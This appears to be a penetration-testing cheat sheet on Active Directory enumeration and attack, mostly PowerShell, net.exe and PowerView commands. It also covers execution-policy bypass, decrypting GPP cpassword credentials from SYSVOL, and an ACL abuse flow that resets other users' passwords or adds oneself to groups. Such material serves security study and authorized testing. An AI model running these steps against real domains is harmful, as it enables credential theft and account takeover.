# Active Directory Enumeration and Attacks

Comprehensive guide to enumerating Active Directory environments, understanding security identifiers, exploiting permissions, and leveraging graph-based analysis for attack path discovery.

---

## Initial Access

```bash
# RDP to domain client
xfreerdp /u:<username> /d:<domain> /v:<target_ip>
```

---

## Legacy Windows Enumeration (net.exe)

### Users and Groups
```cmd
# All domain users
net user /domain

# Specific user details
net user <username> /domain

# All domain groups
net group /domain

# Members of a specific group
net group "Sales Department" /domain
```

### Modify Group Membership (requires GenericAll)
```cmd
net group "Target Group" <username> /add /domain
net group "Target Group" <username> /del /domain
```

---

## PowerShell LDAP Enumeration

### Get Domain and LDAP Path
```powershell
# Domain object (PdcRoleOwner = PDC)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# PDC hostname
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

# Distinguished Name
$DN = ([adsi]'').distinguishedName

# Full LDAP path
$LDAP = "LDAP://$PDC/$DN"
```

### DirectorySearcher Queries
```powershell
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)

# Filter: users (samAccountType 805306368 = normal user)
$dirsearcher.filter = "samAccountType=805306368"
$dirsearcher.FindAll()

# Filter: groups
$dirsearcher.filter = "(objectclass=group)"
$dirsearcher.FindAll()

# Filter: single user membership
$dirsearcher.filter = "name=jeffadmin"
$result = $dirsearcher.FindAll()
$result.Properties.memberof
```

### Reusable LDAP Search Function
```powershell
function LDAPSearch {
    param ([string]$LDAPQuery)
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    return $DirectorySearcher.FindAll()
}

# Usage
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
LDAPSearch -LDAPQuery "(objectclass=group)"
LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
```

### samAccountType Reference

| Type     | Value (decimal) |
|----------|-----------------|
| User     | 805306368       |
| Group    | 268435456       |
| Machine  | 805306369       |

---

## PowerView Enumeration

### Import and Domain Info
```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-NetDomain
```

### Users
```powershell
Get-NetUser
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Groups
```powershell
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
```

### Computers
```powershell
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

### Local Admin and Sessions
```powershell
# Machines where current user is local admin
Find-LocalAdminAccess

# Logged-on users
Get-NetSession -ComputerName <hostname> -Verbose
```

### Object Permissions (ACL)
```powershell
# All ACEs on an object
Get-ObjectAcl -Identity <object>

# Only GenericAll
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# Convert SID to name
Convert-SidToName <SID>
```

### Domain Shares
```powershell
Find-DomainShare
Find-DomainShare -CheckShareAccess   # Only accessible shares
```

---

## Key ACL Permission Types

| Permission             | Meaning                        |
|------------------------|--------------------------------|
| GenericAll             | Full control (add self to group)|
| GenericWrite           | Edit attributes                |
| WriteOwner             | Change owner                   |
| WriteDACL              | Change ACL                     |
| AllExtendedRights      | Reset password, etc.           |
| ForceChangePassword    | Force password change          |
| Self (Self-Membership) | Add self to group              |

---

## Security Identifiers (SIDs)

### SID Structure
```
S-R-I-S1-S2-S3-...-RID

S  = Literal prefix
R  = Revision (always 1)
I  = Identifier Authority (5 = NT Authority)
S1-S3 = Domain identifier (same for all principals in the domain)
RID = Relative Identifier (unique per user/group)
```

### Well-Known RIDs

| RID  | Principal          |
|------|--------------------|
| 500  | Built-in Administrator |
| 501  | Guest              |
| 512  | Domain Admins      |
| 513  | Domain Users       |
| 515  | Domain Computers   |
| 516  | Domain Controllers |
| 518  | Schema Admins      |
| 519  | Enterprise Admins  |

### Resolve Name to SID
```powershell
# PowerView
Convert-NameToSid <user_or_group>

# .NET (no PowerView)
$obj = New-Object System.Security.Principal.NTAccount("DOMAIN", "username")
$sid = $obj.Translate([System.Security.Principal.SecurityIdentifier])
$sid.Value
```

### Resolve SID to Name
```powershell
# PowerView
Convert-SidToName <SID>

# .NET
$sid = New-Object System.Security.Principal.SecurityIdentifier("<SID>")
$sid.Translate([System.Security.Principal.NTAccount]).Value
```

---

## Service Principal Names (SPNs)

```cmd
# By account (built-in)
setspn -L <service_account>
```

```powershell
# All accounts with SPN (PowerView)
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

---

## Domain Shares and GPP Passwords

### Browse SYSVOL
```powershell
dir \\<dc_hostname>\sysvol\<domain>\
dir \\<dc_hostname>\sysvol\<domain>\Policies\
```

### GPP Password Decrypt
```bash
# Decrypt cpassword from GPP XML
gpp-decrypt "<encrypted_cpassword>"
```

---

## Logged-On Users

### PsLoggedOn (SysInternals)
```cmd
# Requires Remote Registry enabled on target
PsLoggedon.exe \\<hostname>
```

### Notes
- NetSessionEnum relies on SrvsvcSessionInfo (DefaultSecurity)
- On newer Windows (Win10 1709+), regular users often cannot enumerate sessions remotely

---

## SharpHound and BloodHound

### SharpHound Collection (Windows)
```powershell
powershell -ep bypass
Import-Module .\Sharphound.ps1

# Full collection
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\<user>\Desktop\ -OutputPrefix "audit"
```

**CollectionMethod All** collects: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices.

### BloodHound Analysis (Linux)
```bash
# Start Neo4j
sudo neo4j start

# Start BloodHound
bloodhound
```

### Key Analysis Queries
- Find all Domain Admins
- Find Shortest Paths to Domain Admins
- Find Shortest Paths to Domain Admins from Owned Principals
- Mark owned principals (right-click node -> Mark as Owned)

---

## ACL-Based Attack Flow

1. **Get your SID**: `Convert-NameToSid <username>`
2. **Get ACLs on target**: `Get-ObjectAcl -Identity "<target>"`
3. **Filter dangerous rights**: Where `SecurityIdentifier` matches your SID and `ActiveDirectoryRights` is GenericAll (or similar)
4. **Exploit**: Use the permission (e.g., password reset with `net user <target> <newpass> /domain`, add self to group)

---

## Quick Reference

| Goal                | Tool / Method                                              |
|---------------------|------------------------------------------------------------|
| Domain users        | `net user /domain`, PowerView `Get-NetUser`                |
| Domain groups       | `net group /domain`, PowerView `Get-NetGroup`              |
| Group members       | `net group "GroupName" /domain`                            |
| PDC / LDAP path     | `.NET Domain::GetCurrentDomain()`                          |
| Computers and OS    | PowerView `Get-NetComputer`                                |
| Local admin access  | PowerView `Find-LocalAdminAccess`                          |
| Logged-on users     | PowerView `Get-NetSession`, PsLoggedOn                     |
| SPNs                | `setspn -L account`, `Get-NetUser -SPN`                    |
| Object ACLs         | PowerView `Get-ObjectAcl`, `Convert-SidToName`             |
| Domain shares       | PowerView `Find-DomainShare`                               |
| GPP passwords       | SYSVOL XML cpassword + `gpp-decrypt`                       |
| Full graph + paths  | SharpHound -> BloodHound (shortest path, owned principals) |

---

## Enumeration Tips

- Re-enumerate after each new user/computer compromise (pivot)
- Nested groups: `net group` only shows direct members; LDAP/PowerView show group-in-group
- High-value targets: Domain Admins, Enterprise Admins, accounts with SPNs, GenericAll/WriteDACL on sensitive objects
- Always check SYSVOL for old GPP XML files and decrypt cpassword
- Document: local admin access, logged-on users, weak ACLs, and shares for attack path planning
